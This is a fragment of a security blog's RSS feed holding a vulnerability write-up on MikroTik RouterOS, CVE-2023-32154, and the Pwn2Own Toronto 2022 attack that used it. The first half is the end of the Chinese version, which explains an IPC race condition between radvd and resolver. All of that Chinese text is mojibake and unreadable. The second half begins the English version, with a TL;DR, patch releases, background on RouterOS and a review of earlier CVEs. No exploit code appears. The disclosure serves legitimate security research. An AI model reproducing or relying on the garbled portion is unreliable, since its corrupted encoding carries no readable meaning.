&lt;p&gt;è¨‚é–±çš„é€™å€‹è¡Œç‚ºæ˜¯é€éç™¼é€ä¸€å€‹æŒ‡ä»¤ç‚º subscribe çš„ nova message çµ¦æƒ³è¦è¨‚é–±çš„ binaryï¼Œç•¶ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_NOTIFYCMD&lt;/code&gt; åŒ…å«äº†å…·é«”æƒ³è¦è¢«é€šçŸ¥çš„ç‹€æ³æ˜¯ä»€éº¼ã€‚
&lt;img src=&quot;/assets/img/blog/20240524/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥åœ¨ä¸Šè¿°æƒ…æ³ä¸­ï¼Œç•¶æœ‰å¦å¤–ä¸€å€‹ process å¾€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; ä¸­å¢åŠ  object æ™‚ï¼Œhandler 1 çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; å‡½å¼æœƒè¢«åŸ·è¡Œã€‚
&lt;img src=&quot;/assets/img/blog/20240524/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨å¤§éƒ¨åˆ†æƒ…æ³è£¡ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; å›ºå®šæœƒå»å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendNotifies&lt;/code&gt; ä¾†é€šçŸ¥é‚£äº›æœ‰è¨‚é–± 0xfe000b äº‹ä»¶çš„ subscribersï¼Œå‘Šè¨´ä»–å€‘è¨‚é–±çš„ç‰©ä»¶å·²è¢«æ”¹å‹•ï¼Œæ‰€ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; é€™è£¡æœƒé€ä¸€å€‹ nova message çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; processï¼Œå‘ŠçŸ¥ç‰©ä»¶è¢«æ”¹å‹•å¾Œçš„çµæœã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ç†è§£äº†è¨‚é–±æ©Ÿåˆ¶ä¹‹å¾Œï¼Œæˆ‘å€‘å¯ä»¥æ›´å…¨é¢çš„ç†è§£ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ä¹‹é–“çš„äº’å‹•å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;ç•¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; å¾ WAN æ”¶åˆ° RA å°åŒ…å¾Œï¼Œå®ƒæœƒå°æ¯å€‹ IPv6 åœ°å€å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; ä¾†è«‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; å»ºç«‹ç›¸é—œçš„ remote objectã€‚è€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ä¸­çš„ handler 4 æœƒè² è²¬è™•ç†é€™å€‹è«‹æ±‚ï¼Œä¸¦åœ¨ handler 2 ä¸­å»ºç«‹å°æ‡‰çš„ ipv6 objectï¼Œæ¥è‘—å› ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; çš„ handler 1 è¨‚é–±äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resovler&lt;/code&gt; çš„ handler 2ï¼Œæ‰€ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; çš„ handler 2 æŠŠç›®å‰æ“æœ‰çš„æ‰€æœ‰ DNS address æ¨æ’­çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; çš„ handler 1ï¼Œæ¥è‘— handler 1 å°±ä¾ç…§ä»–æ”¶åˆ°çš„ DNS address æ§‹é€  RA å°åŒ…ï¼Œä¹‹å¾Œåœ¨ LAN å»£æ’­è©²å°åŒ…ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;race-condition-æˆå› &quot;&gt;Race Condition æˆå› &lt;/h3&gt;

&lt;p&gt;Race condition çš„å•é¡Œå¯¦éš›ä¸Šå‡ºåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; çš„å¯¦ä½œï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; ä¸­ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; ä¾†ç™¼é€ nova messageï¼Œè€Œé€™å€‹æ–¹æ³•æ˜¯ non-blocking çš„ï¼Œè¡¨ç¤º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ä¸­çš„ remote object ä¸¦ä¸æœƒé¦¬ä¸ŠçŸ¥é“å®ƒåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ä¸­å°æ‡‰çš„ id æ˜¯ä»€éº¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å› æ­¤è‹¥ç¬¬äºŒå€‹å°åŒ…å¤ªå¿«åˆ°é”ï¼Œä»¥è‡³æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; é‚„ç„¡å¾å¾—çŸ¥ remote object çš„ id æ˜¯ä»€éº¼çš„æ™‚å€™ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; å°±æ²’æœ‰è¾¦æ³•ç¬¬ä¸€æ™‚é–“ç¢ºå¯¦çš„åˆªé™¤é€™äº›ç‰©ä»¶ï¼Œåªèƒ½å…ˆå°‡å®ƒå€‘æ¨™è¨˜æˆ destroyed é€²è¡Œè»Ÿåˆªé™¤ï¼Œé€™å°±é€ æˆäº† race condition çš„ç”¢ç”Ÿã€‚
&lt;img src=&quot;/assets/img/blog/20240524/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ä¸€æ­¥ä¸€æ­¥çš„åˆ†è§£æ•´å€‹æµç¨‹ï¼š&lt;/p&gt;

&lt;p&gt;é¦–å…ˆï¼Œå› ç‚ºå…©å€‹ process éƒ½æ˜¯ single threadï¼Œæˆ‘å€‘å¯ä»¥å‡è¨­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; å…©å€‹ process ç¾åœ¨æ­£åœ¨åŸ·è¡Œä»–å€‘çš„ç¬¬ä¸€å€‹ loopã€‚&lt;/p&gt;

&lt;p&gt;ç•¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; å¾ WAN æ”¶åˆ°ä¸€å€‹åªæœ‰ä¸€å€‹ DNS address çš„ RA æ™‚ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; æœƒå‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ç™¼é€ä¸€å€‹å‰µå»º remote object çš„è«‹æ±‚ã€‚
&lt;img src=&quot;/assets/img/blog/20240524/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; åœ¨æ”¶åˆ°ç¬¬ä¸€å€‹è«‹æ±‚çš„åŒæ™‚æœƒè¨­å®šä¸€å€‹ timerï¼Œå› çˆ²åœ¨ IPC çš„æ©Ÿåˆ¶ä¸­ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ç„¡æ³•çŸ¥é“å¤šå°‘å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; è«‹æ±‚å±¬æ–¼åŒä¸€æ‰¹ï¼Œæ‰€ä»¥å®ƒéå¸¸ç°¡å–®çš„è¨­äº†ä¸€å€‹ä¸€æ¬¡æ€§çš„ timerï¼Œæ™‚é–“åˆ°äº†æ‰é€å‡ºä¸€æ¬¡ notificationã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ¯æ¬¡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; è™•ç†å®Œå–®å€‹å‰µå»ºçš„è«‹æ±‚å¾Œæ‡‰è©²è¦å›å‚³ä¸€å€‹ nova message ä½œç‚º responseï¼Œé€šçŸ¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; å‰›å‰›è¢«æ–°å¢çš„ remote object çš„ id æ˜¯å¤šå°‘ï¼Œè€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; æœƒé€éæ–¹æ‰é€å‡ºè«‹æ±‚æ™‚ä¸€ä½µè¨»å†Šçš„ä¸€æ¬¡æ€§ ResponseHandler ä¾†è™•ç†é€™å€‹å›æ‡‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†å¦‚æœç¬¬äºŒå€‹ RA å°åŒ…å¤ªå¿«è¢«é€åˆ°ï¼Œä»¥è‡³æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; éƒ½é‚„æ²’æœ‰æŠŠ id é€é response é€å›ä¾†æ™‚ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; åªèƒ½å…ˆæŠŠèˆŠçš„ DNS remote object æ¨™è¨˜æˆ destroyed é€²è¡Œè»Ÿåˆªé™¤ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ç¹¼çºŒç‚ºæ”¶åˆ°çš„ç¬¬äºŒå€‹ RA å°åŒ…ä¸­çš„ RDNSS æ¬„ä½å»ºç«‹æ–°çš„ DNS remote objectï¼Œä½†ç”±æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; é‚„æ²’æœ‰çµæŸç¬¬ä¸€å€‹è¿­ä»£ï¼Œæ‰€ä»¥é€™å€‹æ–°çš„è«‹æ±‚æœƒåœç•™åœ¨ socket è£¡é¢ç­‰å¾…ä¸‹ä¸€å€‹è¿­ä»£æ‰è™•ç†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†å›åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;ï¼Œç¬¬ä¸€å€‹è¿­ä»£ä»¥å›å‚³ id çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; åšæ”¶å°¾ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; çš„ ResponseHandler æœƒæ ¹æ“šæ‹¿åˆ°çš„ id å»æ›´æ–° remote objectï¼Œä½†ç”±æ–¼å°æ‡‰çš„ remote object å·²ç¶“è¢«æ¨™è¨˜æˆåˆªé™¤ï¼Œæ‰€ä»¥ ResponseHandler ä¸æœƒå»æ›´æ–° object idï¼Œè€Œæ˜¯ç›´æ¥åˆªé™¤è©² objectã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ResponseHandler åœ¨åˆªé™¤å®Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ä¸­ä¿å­˜çš„ remote object ä¹‹å¾Œï¼Œæœƒç™¼é€ä¸€å€‹ delete object çš„ message çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;ï¼Œå‘ŠçŸ¥å®ƒå°æ‡‰çš„ remote object å·²ç¶“ä¸å†ä½¿ç”¨æ‰€ä»¥è¦é€²è¡Œåˆªé™¤ï¼Œä½†ä¸€æ¨£æœƒå…ˆå¡åœ¨ socket è£¡é¢ç­‰å¾…è™•ç†&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; é€²å…¥äº†ç¬¬äºŒæ¬¡è¿­ä»£ï¼Œå®ƒæœƒå…ˆæ‹¿åˆ° socket ä¸­ç‚ºäº†ç¬¬äºŒå€‹ RA å‰µå»º remote object çš„è«‹æ±‚ï¼Œç‚ºç¬¬äºŒå€‹ RA çš„ DNS å‰µå»ºå°æ‡‰çš„ remote objectï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†åœ¨æ¥è‘—è™•ç† delete è«‹æ±‚ä¹‹å‰ï¼Œå…ˆå‰è¨­å®šçš„ timer æ™‚é–“åˆ°äº†ï¼Œæ‰€ä»¥&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; æœƒå‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::sendChanges&lt;/code&gt; ä¾†é€šçŸ¥æ‰€æœ‰çš„è¨‚é–±è€…ç¾åœ¨ resolver çŸ¥é“çš„ DNS æœ‰å“ªäº›ï¼Œå› ç‚º object 1 é‚„æ²’æœ‰è¢«åˆªé™¤ï¼Œå› æ­¤ resolver æœƒæŠŠå…©æ¬¡çš„è«‹æ±‚å‰µå»ºçš„ DNS é€šé€šéƒ½æ¨æ’­å‡ºå»ã€‚&lt;/p&gt;

&lt;p&gt;radvd åœ¨æ”¶åˆ°é€™æ¨£çš„è³‡è¨Šä¹‹å¾Œå°±æœƒé¦¬ä¸Šæ§‹é€ ç”¨ä¾†åœ¨ LAN å»£æ’­çš„ RA å°åŒ…ï¼Œæ­¤æ™‚å…©æ¬¡çš„è«‹æ±‚çµæœè¢«æ··åœ¨ä¸€èµ·äº†ï¼Œé€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼ä¸€é–‹å§‹æˆ‘å€‘çš„æ”»æ“Šåªæœƒåœ¨ MacOS ä¸ŠæˆåŠŸçš„åŸå› ã€‚é›–ç„¶é€™å€‹ race condition è½èµ·ä¾†å¾ˆé›£è§¸ç™¼ï¼ˆåˆªé™¤è«‹æ±‚æ¯” timer å…ˆé€²è¡Œè™•ç†çš„è©±å°±ä¸æœƒè§¸ç™¼ï¼‰ï¼Œä½†é€™æ˜¯å› ç‚ºæ–¹ä¾¿è§£é‡‹ï¼Œæ‰€ä»¥æ•´å€‹æµç¨‹è¢«æˆ‘å€‘å¤§å¹…ç°¡åŒ–äº†ï¼Œå¯¦éš›ä¸Šåªè¦å…©å€‹å°åŒ…åˆ°é”çš„æ™‚é–“é–“éš”å¤ çŸ­é€™å€‹ race å°±ä¸€å®šæœƒæˆåŠŸã€‚
&lt;img src=&quot;/assets/img/blog/20240524/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å°çµ-1&quot;&gt;å°çµ&lt;/h3&gt;

&lt;p&gt;é€éä¸Šé¢çš„åˆ†æï¼Œæˆ‘å€‘åœ¨ RouterOS çš„ remote object æ©Ÿåˆ¶ä¸­æ‰¾åˆ°äº†ä¸€å€‹ race condition çš„ patternï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;åœ¨æ–°å¢/åˆªé™¤ remote object æ™‚ï¼Œä½¿ç”¨äº† non-blocking çš„æ–¹æ³•&lt;/li&gt;
  &lt;li&gt;æœ‰è¨‚é–± remote object&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€éé€™é¡å‹çš„æ¼æ´ï¼Œæ”»æ“Šè€…å¯ä»¥å°‡å…©æ¬¡è«‹æ±‚çš„çµæœæ··åˆæˆä¸€å€‹å›å‚³ï¼Œæˆ–è¨±å¯ä»¥ä½œç‚ºä¸€å€‹ç”¨ä¾†ç¹éæŸäº›å®‰å…¨æ€§æª¢æŸ¥çš„æ‰‹æ³•ã€‚å¦‚æœé †åˆ©æ‰¾åˆ°å¯åˆ©ç”¨çš„æ¼æ´ï¼Œæˆ‘å€‘é‚„å¯ä»¥ç”¨ä¾†åƒåŠ  Pwn2Own ç•¶ä¸­çš„ router  é¡åˆ¥ä¸­çš„ LAN é …ç›®ã€‚&lt;/p&gt;

&lt;p&gt;ç„¶è€Œæœ€å¾Œæ™‚é–“ç·Šè¿«ï¼Œæˆ‘å€‘ä¸¦æ²’æœ‰é€é race condition æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„æ¼æ´ã€‚è€Œä¸”ç¦ä¸å–®è¡Œï¼Œåœ¨å ±åæº–å‚™æˆªæ­¢æ™‚ï¼Œæˆ‘å€‘æ‰ç™¼ç¾é€™å¹¾å€‹æœˆä¾†è¢«æˆ‘å€‘æ¸¬è©¦äº†ä¸Šç™¾æ¬¡çš„ exploit å­˜åœ¨ä¸€äº›å•é¡Œï¼Œå°±åœ¨å ±åæˆªæ­¢çš„ä¸‰å€‹å°æ™‚å‰åƒé¬¼æ‰“ç‰†ä¸€æ¨£ï¼Œæ€éº¼æ‰“æ€éº¼å¤±æ•—ï¼Œç°¡ç›´å°±æ˜¯æ•¸ä½ä¸–ä»£çš„é€¢é­”æ™‚åˆ»ï¼Œæˆ‘å€‘ä¸€ç›´æ›´æ–° exploit ä¸¦ä¸”ä¸æ–·æ›´æ–°æº–å‚™ä¸Šäº¤çš„æ¼æ´ç™½çš®æ›¸ï¼Œä¸€ç›´åˆ°å ±åå‰æ­¢çš„åŠå°æ™‚å‰ï¼ˆå‡Œæ™¨å››é»æˆªæ­¢ï¼‰æ‰é †åˆ©å®Œæˆã€‚&lt;/p&gt;

&lt;p&gt;ä½†æ˜¯éå¸¸å¹¸é‹çš„ï¼Œæˆ‘å€‘åœ¨è³½ä¸­åƒ…å˜—è©¦ä¸€æ¬¡å°±é †åˆ©çš„å®Œæˆäº†æ”»æ“Šï¼Œæˆç‚º Pwn2Own æ­·å²ä¸Šç¬¬ä¸€çµ„å®Œæˆ SOHO SMASHUP é€™å€‹æ–°é¡åˆ¥çš„éšŠä¼ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘åœ¨é€™å€‹é …ç›®ä¸­ç²å¾—äº† 10 é» Master of Pwn é»æ•¸é‚„æœ‰ $100,000 ç¾é‡‘çš„çé‡‘ï¼Œæœ€çµ‚åœ¨æ¯”è³½çµç®—æ™‚ï¼ŒDEVCORE ä»¥ 18.5 å€‹ Master of Pwn é»æ•¸å¥ªä¸‹å† è»ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å† è»é™¤äº†ç²å¾— Master of Pwn çš„é ­éŠœã€çæ¯ã€å¤–å¥—ä¹‹å¤–ï¼Œç…§æ…£ä¾‹ï¼Œä¸»è¾¦æ–¹é‚„æœƒå„å¯„ä¸€å°æˆ‘å€‘æ‰“ä¸‹çš„è¨­å‚™éä¾†ã€‚&lt;/p&gt;

&lt;p&gt;ï¼ˆæˆ‘å€‘æ²’è¾¦æ³•æŠŠæ‰€æœ‰æ±è¥¿éƒ½å¡é€²ç›¸æ¡†è£¡ï¼‰
&lt;img src=&quot;/assets/img/blog/20240524/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h2&gt;

&lt;p&gt;åœ¨æœ¬æ¬¡ç ”ç©¶ä¸­ï¼Œæˆ‘å€‘å° RouterOS é€²è¡Œäº†æ·±å…¥æ¢è¨ï¼Œé€²è€Œæ­éœ²äº†ä¸€å€‹æ½›è—åœ¨ RouterOS å…§é•·é”ä¹å¹´çš„å®‰å…¨æ¼æ´ï¼Œä¸¦æˆåŠŸåˆ©ç”¨è©²æ¼æ´åœ¨ Pwn2Own Toronto 2022 çš„è³½äº‹ä¸­å¥ªä¸‹ SOHO SMASHUP çš„é …ç›®ã€‚æ­¤å¤–ï¼Œæˆ‘å€‘é‚„åœ¨ IPC ä¸­ç™¼ç¾äº†ä¸€ç¨®å°è‡´ race condition çš„è¡Œç‚ºæ¨¡å¼ã€‚æœ€å¾Œï¼Œæˆ‘å€‘ä¹Ÿå°‡è³½äº‹ä¸­ä½¿ç”¨çš„å·¥å…·é–‹æºæ–¼ https://github.com/terrynini/routeros-tools ï¼Œä¾›å¤§å®¶åƒè€ƒã€‚&lt;/p&gt;

&lt;p&gt;é€šéæœ¬æ¬¡ç ”ç©¶åŠåˆ†äº«ï¼ŒDEVCORE å¸Œæœ›åˆ†äº«æˆ‘å€‘çš„ç™¼ç¾å’Œç¶“é©—ï¼Œå¾è€Œå”åŠ©ç™½å¸½é§­å®¢æ·±å…¥äº†è§£ RouterOSï¼Œä½¿ä¹‹è®Šå¾—æ›´åŠ é€æ˜æ˜“æ‡‚ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros/</link>
                <guid>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros</guid>
                <pubDate>Fri, 24 May 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pwn2Own Toronto 2022 : A 9-year-old bug in MikroTik RouterOS</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;DEVCORE research team found a 9-year-old WAN bug on RouterOS, the product of MikroTik. Combined with another bug of the Canon printer, DEVCORE becomes the first team ever to successfully complete an attack chain in the brand new SOHO Smashup category of Pwn2Own. And DEVCORE also won the title of Master of Pwn in Pwn2Own Toronto 2022.&lt;/p&gt;

&lt;p&gt;The vulnerability occurs in the radvd of RouterOS, which does not check the length of the RDNSS field when processing ICMPv6 packets for IPv6 SLAAC. As a result, an attacker can trigger the buffer overflow by sending two crafted Router Advertisement packets, that allows an attacker to gain full control over the underlying Linux system of the router without logging in and without user interaction. This vulnerability was assigned as CVE-2023-32154 with a CVSS score of 7.5.&lt;/p&gt;

&lt;p&gt;The vulnerability was reported to MikroTik by &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-710/&quot;&gt;ZDI&lt;/a&gt; on 2022/12/29 and patched on 2023/05/19. It has been patched in the following RouterOS releases:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8&lt;/li&gt;
  &lt;li&gt;Stable Release 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;pwn2own-soho-smashup&quot;&gt;Pwn2Own SOHO Smashup&lt;/h2&gt;

&lt;p&gt;Pwn2Own is a series of contests organized by The Trend Micro Zero Day Initiative (ZDI). They pick popular products as targets for different categories, such as: operating systems, browsers, electric cars, industrial control systems, routers, printers, smart speakers, smartphones, NAS, webcams, etc.&lt;/p&gt;

&lt;p&gt;As long as the participants can exploit a target without user interaction while the device is in its default state and the software is updated to the latest version, the team will receive the corresponding Master of Pwn points and bounty. And the team which has the highest Master of Pwn points will be the winner, who is also known as the â€œMaster of Pwn.â€&lt;/p&gt;

&lt;p&gt;Due to the epidemic, Work From Home or SOHO (Small Office/Home Office) has become very common. Consider that, the Pwn2Own Toronto 2022 has  a special category called SOHO Smashup, in which participants need to hack routers from the WAN side, and then use the router as a trampoline to attack common household devices in LAN, such as smart speakers, printers, etc.&lt;/p&gt;

&lt;p&gt;In addition to the second highest prize of $100,000 (USD), the SOHO Smashup also has the highest score of 10, so if youâ€™re aiming to win, youâ€™ll want to complete this category! Weâ€™ve also chosen the lesser-explored MikroTikâ€™s RouterBoard as the target to avoid bug collisions with others (both the bounty and score are halved when you have a collision with someone else).&lt;/p&gt;

&lt;h2 id=&quot;routeros&quot;&gt;RouterOS&lt;/h2&gt;

&lt;p&gt;The RouterOS is based on the Linux kernel and itâ€™s also the default operating system of MikroTikâ€™s RouterBoard. It can also be installed on a PC to turn it into a router.&lt;/p&gt;

&lt;p&gt;Though the RouterOS do use some GPL-License software, according to the &lt;a href=&quot;https://web.archive.org/web/20220603140018/https://mikrotik.com/downloadterms.html&quot;&gt;downloadterms&lt;/a&gt; page from MikroTikâ€™s website, you have to pay $45 to MikroTik for sending a CD with GPL source, very interesting.&lt;/p&gt;

&lt;p&gt;Glad that there is already a nice guy who uploaded the &lt;a href=&quot;https://github.com/robimarko/routeros-GPL&quot;&gt;GPL source on the Github&lt;/a&gt;, though they didnâ€™t help much on reversing the RouterOS.&lt;/p&gt;

&lt;h3 id=&quot;routeros-v7-and-routeros-v6&quot;&gt;RouterOS v7 and RouterOS v6&lt;/h3&gt;

&lt;p&gt;There are two versions of RouterOS on the download page of MikroTikâ€™s website: RouterOS v7 and RouterOS v6. They are more like two branches of the RouterOS and share a similar design pattern. Because the default installed version of our target, RB2011UiAS-IN, is RouterOS v6, we focus on that version.
&lt;img src=&quot;/assets/img/blog/20240524/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RouterOS does not provide a formal way for users to manipulate the underlying Linux system, and users are trapped in a restricted console with a limited number of commands to manage the router, so there has been a lot of research on how to jailbreak RouterOS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The binary on the RouterOS uses a customized IPC to communicate with each other, and the IPC uses the â€œnova messageâ€ format to pack messages. So we call such kinds of binary â€œnova binaryâ€ afterward.&lt;/p&gt;

&lt;p&gt;Besides, the RouterOS has a special attack surface. The user can manage a RouterOS device remotely from a Windows computer with a GUI tool, WinBox, by sending a nova message through the TCP. So, if the RouterOS fails to validate the privilege of a nova message, the attacker can possibly invade the router by sending a crafted nova message from remote, but itâ€™s not a top priority  because the WinBox is unavailable from WAN by default.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;review-of-related-cves&quot;&gt;Review of Related CVEs&lt;/h2&gt;

&lt;p&gt;We started by reviewing the CVEs in the past few years. There were 80 CVEs related to RouterOS at that time, of which 28 targeted the router itself in pre-auth scenarios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4 out of the 28 CVEs are in scenarios that are more in line with the Pwn2Own rules, which means these vulnerabilities could allow an attacker to spawn a shell on the router or log in as admin without user interaction. Three of the vulnerabilities were discovered between 2017 and 2019, and three of these were discovered â€œin the wild.â€ These four vulnerabilities are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-20149: Also known as Chimay-Red, this is one of the leaked vulnerabilities from the CIAâ€™s â€œVault 7â€ in 2017. The vulnerability occurs when RouterOS parses HTTP requests, and if the Content-Length in the HTTP headers is negative, it will cause Integer Underflow, which together with the Stack Clash attack technique can control the program flow to achieve RCE.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;CVE-2018-7445&lt;/a&gt;: A buffer overflow in the SMB service of RouterOS, which found by black-box fuzzing and is the only one of the four vulnerabilities that was reported by the discoverer. Though the SMB is not  enabled defaultly.&lt;/li&gt;
